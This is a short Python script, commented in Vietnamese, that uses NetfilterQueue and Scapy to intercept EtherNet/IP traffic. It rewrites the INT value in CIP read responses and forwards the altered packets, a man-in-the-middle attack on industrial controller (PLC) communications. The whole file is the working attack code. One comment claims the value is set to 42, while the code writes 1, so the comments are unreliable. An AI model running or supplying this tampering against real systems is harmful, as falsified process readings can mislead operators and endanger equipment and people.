from netfilterqueue import NetfilterQueue
from scapy.all import *

def process_packet(packet):
    scapy_pkt = IP(packet.get_payload())  # Chuyển gói tin sang Scapy
    if scapy_pkt.haslayer(Raw):  # Kiểm tra gói tin có chứa payload
        raw_data = scapy_pkt[Raw].load  # Truy cập payload

        # Kiểm tra ENIP và CIP trong payload
        if raw_data[:2] == b"\x6f\x00":  # Header ENIP Send RR Data
            if raw_data[30:32] == b"\x02\x00" and raw_data[32:36] == b"\x00\x00\x00\x00" and raw_data[36:38] == b"\xb2\x00":
                # Xác định header CIP (bắt đầu từ byte 40)
                cip_start = 40
                if raw_data[cip_start:cip_start+2] == b"\xcc\x00" and raw_data[cip_start+4:cip_start+6] == b"\xc3\x00":
                    # CIP response with INT type
                    print(f"Original CIP Raw Data: {raw_data}")
                    # Sửa đổi giá trị INT thành 42 (0x2a)
                    modified_data = raw_data[:cip_start+6] + b"\x01\x00" + raw_data[cip_start+8:]
                    scapy_pkt[Raw].load = modified_data
                    del scapy_pkt[IP].chksum  # Xóa checksum để Scapy tự tính toán lại
                    del scapy_pkt[TCP].chksum
                    packet.set_payload(bytes(scapy_pkt))  # Ghi đè payload
                    print(f"Modified CIP Raw Data: {scapy_pkt[Raw].load}")

    packet.accept()  # Chấp nhận và chuyển tiếp gói tin

# Tạo hàng đợi và xử lý
nfqueue = NetfilterQueue()
nfqueue.bind(1, process_packet)  # Gắn hàng đợi số 1 với hàm xử lý
try:
    nfqueue.run()  # Chạy chương trình
except KeyboardInterrupt:
    print("Exiting...")
    nfqueue.unbind()
